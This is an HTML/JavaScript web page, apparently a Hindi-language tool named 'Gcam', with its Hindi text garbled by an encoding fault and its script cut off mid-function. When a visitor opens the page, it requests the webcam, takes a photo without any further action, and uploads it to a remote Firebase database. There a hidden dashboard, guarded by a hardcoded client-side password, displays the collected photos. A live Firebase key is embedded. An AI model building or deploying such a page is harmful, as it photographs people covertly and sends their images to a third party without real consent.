<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Gcam тАФ рдирд┐рдЬреА рдХреИрдорд░рд╛ рдХреИрдкреНрдЪрд░ рд╕рд┐рд╕реНрдЯрдо</title>

  <!-- Tailwind CSS -->
  <script src="https://cdn.tailwindcss.com"></script>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
    body { font-family: 'Inter', sans-serif; background-color: #f7f7f7; }
    .image-container::-webkit-scrollbar { width: 8px; }
    .image-container::-webkit-scrollbar-track { background: #e0e0e0; border-radius: 10px; }
    .image-container::-webkit-scrollbar-thumb { background: #6b7280; border-radius: 10px; }
    .image-container::-webkit-scrollbar-thumb:hover { background: #4b5563; }
  </style>
</head>
<body class="p-4">
  <div class="max-w-4xl mx-auto">
    <header class="mb-6">
      <h1 class="text-2xl font-bold">ЁЯУ╕ Gcam тАФ рдирд┐рдЬреА рдХреИрдорд░рд╛ рдХреИрдкреНрдЪрд░ рд╕рд┐рд╕реНрдЯрдо</h1>
      <p class="text-gray-600">рд╕рд┐рд░реНрдл рдПрдбрдорд┐рди рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж рдбреИрд╢рдмреЛрд░реНрдб рджрд┐рдЦреЗрдЧрд╛ред рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдХреЗ рдЖрддреЗ рд╣реА рдСрдЯреЛ-рдХреИрдкреНрдЪрд░ рд╣реЛрдЧрд╛ред</p>
    </header>

    <!-- Status / Errors -->
    <div id="status-message" class="mb-4 text-sm text-green-700"></div>
    <div id="error-box" class="hidden bg-red-100 text-red-700 p-3 rounded mb-4">
      <span id="error-text"></span>
      <button onclick="closeErrorBox()" class="ml-2 text-sm underline">рдмрдВрдж рдХрд░реЗрдВ</button>
    </div>

    <!-- Admin Login Gate -->
    <section id="login-gate" class="bg-white rounded shadow p-4 mb-6">
      <h2 class="text-lg font-semibold mb-3">ЁЯФР рдПрдбрдорд┐рди рд▓реЙрдЧрд┐рди</h2>
      <div class="grid grid-cols-1 md:grid-cols-3 gap-3">
        <input id="admin-id" class="border rounded px-3 py-2" placeholder="рдПрдбрдорд┐рди рдЖрдИрдбреА" />
        <input id="admin-password" type="password" class="border rounded px-3 py-2" placeholder="рдкрд╛рд╕рд╡рд░реНрдб" />
        <button id="login-button" class="bg-green-600 text-white rounded px-4 py-2">рд▓реЙрдЧрд┐рди</button>
      </div>
    </section>

    <!-- Capture View -->
    <section id="capture-view" class="bg-white rounded shadow p-4 mb-6">
      <h2 class="text-lg font-semibold mb-3">рдХреИрдорд░рд╛</h2>
      <video id="camera-stream" autoplay playsinline class="w-full rounded border mb-3"></video>
      <div class="flex gap-3">
        <button id="capture-button" class="bg-blue-600 text-white rounded px-4 py-2">ЁЯУ╖ рдореИрдиреНрдпреБрдЕрд▓ рдХреИрдкреНрдЪрд░</button>
        <span id="capture-hint" class="text-xs text-gray-500">рд╡рд┐рдЬрд╝рд┐рдЯ рдкрд░ рдСрдЯреЛ-рдХреИрдкреНрдЪрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИтАж</span>
      </div>
    </section>

    <!-- Admin-only Dashboard -->
    <section id="dashboard-view" class="hidden bg-white rounded shadow p-4">
      <h2 class="text-lg font-semibold mb-3">ЁЯЧВя╕П рдбреИрд╢рдмреЛрд░реНрдб тАФ рдХреИрдкреНрдЪрд░ рдХреА рдЧрдИ рддрд╕реНрд╡реАрд░реЗрдВ</h2>
      <div id="images-grid" class="grid grid-cols-2 md:grid-cols-3 gap-4 image-container overflow-y-auto max-h-[28rem]"></div>
    </section>

    <footer class="mt-8 text-center text-xs text-gray-500">
      рдмреНрд░рд╛рдВрдбреЗрдб рджреНрд╡рд╛рд░рд╛ тАФ rituraj _ cybersecurity | INDIAGPT тАв Gcam
    </footer>
  </div>

  <!-- Firebase SDKs -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
    import { getFirestore, collection, addDoc, serverTimestamp, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCsn3iH_Pd7gZMjLRxesAQpWiz8yB1WCqk",
      authDomain: "privatecameracapture.firebaseapp.com",
      projectId: "privatecameracapture",
      storageBucket: "privatecameracapture.appspot.com",
      messagingSenderId: "329207253992",
      appId: "1:329207253992:web:6bb6b6bb54b7d8888252ed",
      measurementId: "G-VF6F22ESHP"
    };

    const ADMIN_ID = "8521574912";
    const ADMIN_PASSWORD = "rituraj@123";
    const LOGIN_KEY = "admin_logged_in";
    const STORAGE_ADMIN_ID = "8521574912";

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getFirestore(app);

    const statusMessage = document.getElementById("status-message");
    const errorBox = document.getElementById("error-box");
    const errorText = document.getElementById("error-text");
    const loginGate = document.getElementById("login-gate");
    const dashboardView = document.getElementById("dashboard-view");
    const imagesGrid = document.getElementById("images-grid");

    const adminIdInput = document.getElementById("admin-id");
    const adminPasswordInput = document.getElementById("admin-password");
    const loginButton = document.getElementById("login-button");

    const videoEl = document.getElementById("camera-stream");
    const captureButton = document.getElementById("capture-button");

    let userId = null;
    let hasAutoCaptured = false;

    signInAnonymously(auth)
      .then(() => {
        userId = auth.currentUser?.uid || "anonymous";
        status("рд╡рд┐рдЬрд╝рд┐рдЯрд░ рдСрде рд╕рдлрд▓ред");
        startCamera();
      })
      .catch(err => showError("рдЕрдирд╛рдо рдСрде рд╡рд┐рдлрд▓: " + err.message));

    loginButton.addEventListener("click", () => {
      const enteredId = (adminIdInput.value || "").trim();
      const enteredPw = (adminPasswordInput.value || "").trim();

      if (enteredId === ADMIN_ID && enteredPw === ADMIN_PASSWORD) {
        sessionStorage.setItem(LOGIN_KEY, "true");
        loginGate.classList.add("hidden");
        dashboardView.classList.remove("hidden");
        status("рдПрдбрдорд┐рди рд▓реЙрдЧрд┐рди рд╕рдлрд▓ред");
        subscribePhotos();
      } else {
        showError("рдЧрд▓рдд рдПрдбрдорд┐рди ID рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдбред");
      }
    });

    captureButton.addEventListener("click", async () => {
      await captureAndSave();
    });

    // тЬЕ рдирдпрд╛ рдХреИрдорд░рд╛ рдФрд░ рдСрдЯреЛ-рдХреИрдкреНрдЪрд░ logic
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        videoEl.srcObject = stream;

        // рдЬрдм рд╡реАрдбрд┐рдпреЛ ready рд╣реЛ рддрдм auto-capture рдХрд░рдирд╛
        videoEl.onloadedmetadata = () => {
          videoEl.play();
          autoCaptureOnce();
        };
      } catch (err) {
        showError("рдХреИрдорд░рд╛ рдПрдХреНрд╕реЗрд╕ рд╡рд┐рдлрд▓: " + err.message);
      }
    }

    async function autoCaptureOnce() {
      if (hasAutoCaptured) return;
      hasAutoCaptured = true;
      await captureAndSave();
    }

    async function captureAndSave() {
      try {
        captureButton.disabled = true;
        const w = videoEl.videoWidth || 640;
        const h = videoEl.videoHeight || 480;
        const canvas = document.createElement("canvas");
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(videoEl, 0, 0, w, h);
        const base64Image = canvas.toDataURL("image/jpeg", 0.8);

        const photosRef = collection(db, "artifacts", "gcam-app", "users", STORAGE_ADMIN_ID, "captured_photos");
        await addDoc(photosRef, {
          base64Image,
          timestamp: serverTimestamp(),
          capturedBy: userId,
          capturedAt: new Date().toLocaleString("hi-IN")
        });

        status("тЬЕ рдлреЛрдЯреЛ рд╕реЗрд╡ рд╣реЛ рдЧрдИред");
    
